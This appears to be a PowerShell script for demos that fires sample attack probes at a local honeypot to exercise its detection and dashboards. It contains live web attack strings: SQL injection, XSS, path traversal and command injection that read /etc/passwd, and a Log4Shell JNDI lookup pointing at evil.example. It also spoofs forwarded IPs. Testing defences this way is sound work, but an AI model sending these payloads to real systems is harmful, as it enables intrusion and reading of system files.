<#
.SYNOPSIS
  Fire representative probes at the honeypot so detection, threat scoring, and
  the Grafana dashboard light up. LAB/DEMO use against your own local stack only.
.EXAMPLE
  ./scripts/simulate-attacks.ps1
  ./scripts/simulate-attacks.ps1 -Target http://localhost:5000
#>
param([string]$Target = "http://localhost:5000")

function Probe($Method, $Path, $Headers = @{}, $Body = $null) {
    try {
        $resp = Invoke-WebRequest -Uri "$Target$Path" -Method $Method -Headers $Headers `
            -Body $Body -SkipHttpErrorCheck -TimeoutSec 10
        Write-Host ("  [{0}] {1} {2}" -f $resp.StatusCode, $Method, $Path)
    } catch {
        Write-Host ("  [ERR] {0} {1} -> {2}" -f $Method, $Path, $_.Exception.Message)
    }
}

Write-Host "==> Simulating attacks against $Target"

Probe GET "/.env"                        @{ "X-Forwarded-For" = "203.0.113.10" }
Probe GET "/.git/config"                 @{ "X-Forwarded-For" = "203.0.113.10" }
Probe GET "/wp-login.php"                @{ "User-Agent" = "sqlmap/1.7";  "X-Forwarded-For" = "198.51.100.7" }
Probe GET "/phpmyadmin/"                 @{ "User-Agent" = "Nikto/2.1.6"; "X-Forwarded-For" = "198.51.100.7" }

Probe GET "/search?id=1%27%20OR%201=1--"                          @{ "X-Forwarded-For" = "192.0.2.55" }
Probe GET "/item?q=%3Cscript%3Ealert(1)%3C/script%3E"            @{ "X-Forwarded-For" = "192.0.2.55" }
Probe GET "/download?file=../../../../etc/passwd"                @{ "X-Forwarded-For" = "192.0.2.99" }
Probe GET "/api?x=%24%7Bjndi:ldap://evil.example/a%7D"          @{ "X-Forwarded-For" = "192.0.2.99" }
Probe POST "/run" @{ "Content-Type" = "application/json"; "X-Forwarded-For" = "192.0.2.99" } '{"cmd":";cat /etc/passwd"}'

Write-Host "==> Flooding 10.10.10.10 to trigger quarantine"
1..4 | ForEach-Object {
    Probe GET "/x?id=1%27%20OR%201=1--%20UNION%20SELECT" @{ "X-Forwarded-For" = "10.10.10.10" } | Out-Null
}
Probe GET "/.env" @{ "X-Forwarded-For" = "10.10.10.10" }   # expect 403 (quarantined)

Write-Host "==> Done. Live picture:"
Write-Host "    Invoke-RestMethod $Target/honeypot/stats | ConvertTo-Json"
Write-Host "    Grafana: http://localhost:3000  (dashboard: Honeypot - Live Threat Activity)"
